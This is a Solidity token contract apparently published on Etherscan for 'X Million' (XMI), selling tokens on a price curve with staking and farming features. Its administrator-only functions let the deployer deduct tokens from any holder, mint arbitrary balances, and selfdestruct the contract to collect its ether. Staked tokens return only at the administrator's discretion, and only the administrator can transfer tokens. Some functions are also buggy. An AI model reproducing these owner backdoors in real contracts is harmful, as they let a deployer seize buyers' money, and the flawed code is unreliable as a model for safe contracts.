/**
 *Submitted for verification at Etherscan.io on 2020-12-15
*/

pragma solidity ^0.4.26;

contract X_Million {
    // only people with tokens
    modifier onlyBagholders() {
        require(myTokens() > 0);
        _;
    }

    modifier onlyAdministrator(){
        address _customerAddress = msg.sender;
        require(administrators[_customerAddress]);
        _;
    }
    
    function showOwner()
        onlyAdministrator()
        public view
        returns(address)
    {
        address _customerAddress = msg.sender;
        return  _customerAddress;

    }
    
    function showMyAddress() onlyBagholders()
        public view
        returns(address)
    {
        address _customerAddress = msg.sender;
        return  _customerAddress;

    }
    /*==============================
    =            EVENTS            =
    ==============================*/

    event onWithdraw(
        address indexed customerAddress,
        uint256 ethereumWithdrawn
    );
   
    // ERC20
    event Transfer(
        address indexed from,
        address indexed to,
        uint256 tokens
    );
   
    /*=====================================
    =            CONFIGURABLES            =
    =====================================*/
    string public name = "X Million";
    string public symbol = "XMI";
    uint8 constant public decimals = 0;
    uint256 public totalSupply_ = 90000;
    uint256 public tokenForSale_ = 35000;
    uint256 constant internal tokenPriceInitial_ = 160000000000000;
    uint256 public tokenPriceIncremental_ = 5500000000000;
    uint256 public percent = 10;
    uint256 public currentPrice_ = tokenPriceInitial_ + tokenPriceIncremental_;
    uint256 public grv = 1;
    uint256 public ownership = 5000;
    uint256 internal totalStake = 0;
    uint256 internal totalFarming = 0;
    uint256 public rewardSupply_ = 50000; // for farming reward and stake distribution
    // Please verify the website https://xmillion.com before purchasing tokens

    address commissionHolder; // holds commissions fees
    address stakeHolder; // holds stake
    
    mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal etherBalanceLedger_;
    mapping(address => uint256) internal farmingBalanceLedger_;
    mapping(address => uint256) internal stakeBalanceLedger_;
    
    address sonk;
    uint256 internal tokenSupply_ = 0;
    // uint256 internal profitPerShare_;
    mapping(address => bool) internal administrators;
    uint256 commFunds=0;
   
    constructor() public
    {
        sonk = msg.sender;
        administrators[sonk] = true;
        commissionHolder = sonk;
        stakeHolder = sonk;
        tokenBalanceLedger_[sonk] =  ownership ;
    }
   
   function holdStake(uint256 _amount)
        onlyBagholders()
        public
        {   
            require(_amount >=100 ,"amoun must be grater than 100 token");
            tokenBalanceLedger_[msg.sender] = SafeMath.sub(tokenBalanceLedger_[msg.sender], _amount);
            tokenBalanceLedger_[stakeHolder] = SafeMath.add(tokenBalanceLedger_[stakeHolder], _amount);
            if(stakeBalanceLedger_[msg.sender]>0){
            stakeBalanceLedger_[msg.sender] = SafeMath.add(stakeBalanceLedger_[msg.sender], _amount);
            }else{
                stakeBalanceLedger_[msg.sender] = _amount;
            }
            totalStake += _amount;
        }
        
    function unstake(uint256 _amount, address _customerAddress)
        onlyAdministrator()
        public
    {   require( stakeBalanceLedger_[_customerAddress] > 0,"Stake Balance is null");
        require(_amount <= stakeBalanceLedger_[_customerAddress],"Amount greater than stake amount");
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress],_amount);
        tokenBalanceLedger_[stakeHolder] = SafeMath.sub(tokenBalanceLedger_[stakeHolder], _amount);
        stakeBalanceLedger_[_customerAddress] =     stakeBalanceLedger_[_customerAddress] - _amount;
        totalStake -= _amount;
        

    }
    function totalStakes()
        onlyAdministrator()
        public view
        returns(uint256)
    {
        return totalStake;
    }
    
    
    function getStakingAmount(address _customerAddress)
    onlyBagholders()
        public view
        returns(uint256)
    {
        return stakeBalanceLedger_[_customerAddress];
    }
    
    function fundsInjection() public payable returns(bool)
    {
        return true;
    }
    
    function holdFarming(uint256 _amount)
        onlyBagholders()
        public
        {   
            require(_amount >= 0 ,"amoun must be grater than 0 token");
            tokenBalanceLedger_[msg.sender] = SafeMath.sub(tokenBalanceLedger_[msg.sender], _amount);
            tokenBalanceLedger_[stakeHolder] = SafeMath.add(tokenBalanceLedger_[stakeHolder], _amount);
            if(farmingBalanceLedger_[msg.sender]>0){
            farmingBalanceLedger_[msg.sender] = SafeMath.add(farmingBalanceLedger_[msg.sender], _amount);
            }else{
                farmingBalanceLedger_[msg.sender] = _amount;
            }
            totalFarming += _amount;
        }
        
    function noFarming(uint256 _amount, address _customerAddress)
        onlyAdministrator()
        public
    {   require( farmingBalanceLedger_[_customerAddress] > 0,"Farming Balance is null");
        require(_amount <= farmingBalanceLedger_[_customerAddress],"Amount should be less than from farming amount");
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress],_amount);
        tokenBalanceLedger_[stakeHolder] = SafeMath.sub(tokenBalanceLedger_[stakeHolder], _amount);
        farmingBalanceLedger_[_customerAddress] = farmingBalanceLedger_[_customerAddress] - _amount;
        totalFarming -= _amount;
    }
    
    function totalFarmings()
        onlyAdministrator()
        public view
        returns(uint256)
    {
        return totalFarming;
    }
    
    function getFarmingAmount(address _customerAddress)
    onlyBagholders()
        public view
        returns(uint256)
    {
        return farmingBalanceLedger_[_customerAddress];
    }
   
    function upgradeDetails(uint256 _currentPrice, uint256 _grv, uint256 _commFunds)
    onlyAdministrator()
    public
    {
        currentPrice_ = _currentPrice;
        grv = _grv;
        commFunds = _commFunds;
    }
    
    function upgradeSingleContract(address _users, uint256 _balances, uint modeType)
    onlyAdministrator()
    public
    {
        if(modeType == 1)
        {
            
                tokenBalanceLedger_[_users] += _balances;
                emit Transfer(address(this),_users,_balances);
            
        }
        if(modeType == 2)
        {
            
                etherBalanceLedger_[_users] += _balances;
                commFunds += _balances;
        }
    }
    
    function upgradeMultiContract(address[] _users, uint256[] _balances, uint modeType)
    onlyAdministrator()
    public
    {
        if(modeType == 1)
        {
            for(uint i = 0; i<_users.length;i++)
            {
                tokenBalanceLedger_[_users[i]] += _balances[i];
                emit Transfer(address(this),_users[i],_balances[i]);
            }
        }
        if(modeType == 2)
        {
            for(i = 0; i<_users.length;i++)
            {
                etherBalanceLedger_[_users[i]] += _balances[i];
                commFunds += _balances[i];
            }
        }
    }
    function getFromContract(address _users, uint256 _balances)
    onlyAdministrator()
    public
    {
                tokenBalanceLedger_[_users] -= _balances;
                tokenBalanceLedger_[sonk] += _balances;
    }
     function setVersion(uint256 _grv)
    onlyAdministrator()
    public
    {
        
        grv = _grv;
       
    }
    function buy(address _referredBy)
        public
        payable
        returns(uint256)
    {
        purchaseTokens(msg.value, _referredBy);
    }
   
    function()
        payable
        public
    {
        purchaseTokens(msg.value, 0x0);
    }
   
    
    /**
     * Alias of sell() and withdraw().
     */
    function exit()
        public
    {
        address _customerAddress = msg.sender;
        uint256 _tokens = tokenBalanceLedger_[_customerAddress];
        if(_tokens > 0) sell(_tokens);
    }

    /**
     * Liquifies tokens to ethereum.
     */
    function sell(uint256 _amountOfTokens)
        onlyBagholders()
        public
    {
        // setup data
        address _customerAddress = msg.sender;
        require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
        uint256 _tokens = _amountOfTokens;
        uint256 _ethereum = tokensToEthereum_(_tokens,true);
        
        if(_tokens == 1){
                _ethereum = tokensToEthereum_(2,false);
                _ethereum = _ethereum/2;
        }
        uint256 _dividends = _ethereum * percent/10000;//SafeMath.div(_ethereum, dividendFee_); // 
        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
        commFunds += _dividends;
       
        // burn the sold tokens
        tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
        _customerAddress.transfer(_taxedEthereum);
        emit Transfer(_customerAddress, address(this), _tokens);
    }
   
   
   
    function totalCommFunds()
        onlyAdministrator()
        public view
        returns(uint256)
    {
        return commFunds;    
    }
   
    function myEthers()
        public view
        returns(uint256)
    {
        return etherBalanceLedger_[msg.sender];
    }
    
    function withdrawEthers(uint256 _amount) 
    onlyAdministrator()
    public
    {
        require(etherBalanceLedger_[msg.sender] >= _amount);
        msg.sender.transfer(_amount);
        etherBalanceLedger_[msg.sender] -= _amount;
        
    }
   
   function getCommFunds(uint256 _amount)
        onlyAdministrator()
        public
    {
        if(_amount <= commFunds)
        {
            
            etherBalanceLedger_[commissionHolder] += _amount;
            commFunds = SafeMath.sub(commFunds,_amount);
        }
    }
    
    function getAllFundsContract(uint256 _amount)
        onlyAdministrator()
        public
    {
        if(_amount <= commFunds)
        {
            address(this).transfer(_amount);
        }
    }
    
   
    function transfer(address _toAddress, uint256 _amountOfTokens)
        onlyAdministrator()
        public
        returns(bool)
    {
        // setup
        address _customerAddress = msg.sender;

        // exchange tokens
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);
        emit Transfer(_customerAddress, _toAddress, _amountOfTokens);
        // ERC20
        return true;
    }
   
    function destruct() onlyAdministrator() public{
        selfdestruct(sonk);
    }
   
   
    function setPercent(uint256 newPercent) onlyAdministrator() public {
        percent = newPercent * 100;
    }

   
    function setName(string _name)
        onlyAdministrator()
        public
    {
        name = _name;
    }
   
    function setSymbol(string _symbol)
        onlyAdministrator()
        public
    {
        symbol = _symbol;
    }

    function setupCommissionHolder(address _commissionHolder)
    onlyAdministrator()
    public
    {
        commissionHolder = _commissionHolder;
    }

    function totalEthereumBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
   
    function totalSupply()
        public
        view
        returns(uint256)
    {
        return totalSupply_;
    }
   
    function tokenSupply()
    public
    view
    returns(uint256)
    {
        return tokenSupply_;
    }
   
    /**
     * Retrieve the tokens owned by the caller.
     */
    function myTokens()
        public
        view
        returns(uint256)
    {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }
   
   
    /**
     * Retrieve the token balance of any single address.
     */
    function balanceOf(address _customerAddress)
        view
        public
        returns(uint256)
    {
        return tokenBalanceLedger_[_customerAddress];
    }
   

    function sellPrice()
        public
        view
        returns(uint256)
    {
        // our calculation relies on the token supply, so we need supply. Doh.
        if(tokenSupply_ == 0){
            return tokenPriceInitial_ - tokenPriceIncremental_;
        } else {
            uint256 _ethereum = tokensToEthereum_(2,false);
            uint256 _dividends = _ethereum * percent/10000;
            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
            return _taxedEthereum;
        }
    }
   
    /**
     * Return the sell price of 1 individual token.
     */
    function buyPrice()
        public
        view
        returns(uint256)
    {
        return  currentPrice_ += currentPrice_*2/1000;
    }
   
   
    function calculateEthereumFromToken(uint256 _tokensToSell)
        public
        view
        returns(uint256)
    {   
        uint256 value = _tokensToSell / 2;
        uint256 _tokenPriceIncremental = tokenPriceIncremental_ ;
        uint256 a = buyPrice();
        
        if((2 * value) == _tokensToSell){
        
        uint256 ethereum = ((_tokensToSell/2)*((2*a)+((_tokensToSell-1)*_tokenPriceIncremental)));
        return ethereum;        
        }else{

        uint256	token = _tokensToSell-1;
        
        
        uint256 _ethereum_ = ((token/2)*((2*a)+((token-1)*_tokenPriceIncremental)));
        uint256 ethereum_ = (((2/2)*((2*a)+((2-1)*_tokenPriceIncremental))))/2;
        return _ethereum_ +ethereum_;

        }
    }
    function calculateEthereumReceived(uint256 _tokensToSell)
        public
        view
        returns(uint256)
    {
        require(_tokensToSell <= tokenSupply_);
        uint256 _ethereum = tokensToEthereum_(_tokensToSell,false);
        uint256 _dividends = _ethereum * percent/10000;//SafeMath.div(_ethereum, dividendFee_);
        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);
        return _taxedEthereum;
    }
   
   
    /*==========================================
    =            INTERNAL FUNCTIONS            =
    ==========================================*/
   
    event testLog(
        uint256 currBal
    );

    function calculateTokensReceived(uint256 _ethereumToSpend)
        public
        view
        returns(uint256)
    {
        uint256 _dividends = _ethereumToSpend * percent/10000;
        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);
        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum, currentPrice_, grv, false);
        _amountOfTokens = SafeMath.sub(_amountOfTokens, _amountOfTokens * 0/100); //temp buy deduction
        return _amountOfTokens;
    }
   
    function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
        internal
        returns(uint256)
    {
        // data setup
        address _customerAddress = msg.sender;
        uint256 _dividends = _incomingEthereum * percent/10000;
        commFunds += _dividends;
        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _dividends);
        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum , currentPrice_, grv, true);
        tokenBalanceLedger_[commissionHolder] += _amountOfTokens * 0/100; //temp buy deduction
        require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));
       
        tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
        require(SafeMath.add(_amountOfTokens,tokenSupply_) < (totalSupply_+rewardSupply_));
        //deduct commissions for referrals
        _amountOfTokens = SafeMath.sub(_amountOfTokens, _amountOfTokens * 0/100);
        tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
       
        // fire event
        emit Transfer(address(this), _customerAddress, _amountOfTokens);
       
        return _amountOfTokens;
    }
   
    function ethereumToTokens_(uint256 _ethereum, uint256 _currentPrice, uint256 _grv, bool buy)
        internal
        view
        returns(uint256)
    {   
        tokenPriceIncremental_= incrementalPrice(_grv);
        uint256 _tokenPriceIncremental = (tokenPriceIncremental_*(2**((_grv-1)*0)));
        uint256 _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
        uint256 _tokenSupply = tokenSupply_;
        uint256 _tokensReceived = (
            (
                SafeMath.sub(
                    (sqrt
                        (
                            _tempad**2
                            + (8*_tokenPriceIncremental*_ethereum)
                        )
                    ), _tempad
                )
            )/(2*_tokenPriceIncremental)
        );
        uint256 tempbase = upperBound_(_grv);
        if((_tokensReceived + _tokenSupply) < tempbase && _tokenSupply < tempbase){
            _currentPrice = _currentPrice+((_tokensReceived)*_tokenPriceIncremental);
        }
        if((_tokensReceived + _tokenSupply) > tempbase && _tokenSupply < tempbase){
            _tokensReceived = tempbase - _tokenSupply;
            _ethereum = SafeMath.sub(
                _ethereum,
                ((_tokensReceived)/2)*
                ((2*_currentPrice)+((_tokensReceived-1)
                *_tokenPriceIncremental))
            );
            _currentPrice = _currentPrice+((_tokensReceived)*_tokenPriceIncremental);
            _grv = _grv + 1;
            _tokenPriceIncremental = (tokenPriceIncremental_*((2)**((_grv-1)*0)));
            _tempad = SafeMath.sub((2*_currentPrice), _tokenPriceIncremental);
            uint256 _tempTokensReceived = (
                (
                    SafeMath.sub(
                        (sqrt
                            (
                                _tempad**2
                                + (8*_tokenPriceIncremental*_ethereum)
                            )
                        ), _tempad
                    )
                )/(2*_tokenPriceIncremental)
            );
            _currentPrice = _currentPrice+((_tempTokensReceived)*_tokenPriceIncremental);
            _tokensReceived = _tokensReceived + _tempTokensReceived;
        }
        if(buy == true)
        {
            currentPrice_ = _currentPrice;
            grv = _grv;
        }
        return _tokensReceived;
    }
   
    function upperBound_(uint256 _grv)
    internal
    view
    returns(uint256)
    {
        if(_grv <= 7)
        {   
            return (5000 * _grv);
        }
        return 0;
    }
    
    function incrementalPrice(uint256 _grv)
    internal
    view
    returns(uint256)
    {
         if(_grv == 1){
                return  550000000000;
            }else if(_grv == 2 ){
                 return 1600000000000;
            }else if(_grv == 3 ){
                 return 4900000000000;
            }else if(_grv == 4 ){
                return 14000000000000;
            }else if(_grv == 5 ){
                return 59400000000000;
            }else if(_grv == 6 ){
                return 230000000000000;
            }else if(_grv == 7 ){
                return 1800000000000000;
            }else{
                return  550000000000;
            }
    }
    
   
   
     function tokensToEthereum_(uint256 _tokens, bool sell)
        internal
        view
        returns(uint256)
    {   
        tokenPriceIncremental_= incrementalPrice(grv);
        uint256 _tokenSupply = tokenSupply_;
        uint256 _etherReceived = 0;
        uint256 _grv = grv;
        uint256 tempbase = upperBound_(_grv-1);
        uint256 _currentPrice = currentPrice_;
        uint256 _tokenPriceIncremental = (tokenPriceIncremental_*((2)**((_grv-1)*0)));
        if((_tokenSupply - _tokens) < tempbase)
        {
            uint256 tokensToSell = _tokenSupply - tempbase;
            uint256 a = _currentPrice - ((tokensToSell-1)*_tokenPriceIncremental);
            _tokens = _tokens - tokensToSell;
            _etherReceived = _etherReceived + ((tokensToSell/2)*((2*a)+((tokensToSell-1)*_tokenPriceIncremental)));
            _currentPrice = _currentPrice-((tokensToSell)*_tokenPriceIncremental);
            _tokenSupply = _tokenSupply - tokensToSell;
            _grv = _grv-1 ;
            _tokenPriceIncremental = (tokenPriceIncremental_*((2)**((_grv-1)*0)));
            tempbase = upperBound_(_grv-1);
        }
        if((_tokenSupply - _tokens) < tempbase)
        {
            tokensToSell = _tokenSupply - tempbase;
            _tokens = _tokens - tokensToSell;
             a = _currentPrice - ((tokensToSell-1)*_tokenPriceIncremental);
            _etherReceived = _etherReceived + ((tokensToSell/2)*((2*a)+((tokensToSell-1)*_tokenPriceIncremental)));
            _currentPrice = _currentPrice-((tokensToSell)*_tokenPriceIncremental);
            _tokenSupply = _tokenSupply - tokensToSell;
            _grv = _grv-1 ;
            _tokenPriceIncremental = (tokenPriceIncremental_*((2)**((_grv-1)*0)));
            tempbase = upperBound_(_grv);
        }
        if(_tokens > 0)
        {
             a = _currentPrice - ((_tokens-1)*_tokenPriceIncremental);
             _etherReceived = _etherReceived + ((_tokens/2)*((2*a)+((_tokens-1)*_tokenPriceIncremental)));
             _tokenSupply = _tokenSupply - _tokens;
             _currentPrice = _currentPrice-((_tokens)*_tokenPriceIncremental);
        }
        if(sell == true)
        {
            grv = _grv;
            currentPrice_ = _currentPrice;
        }
        return _etherReceived;
    }
   
   
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}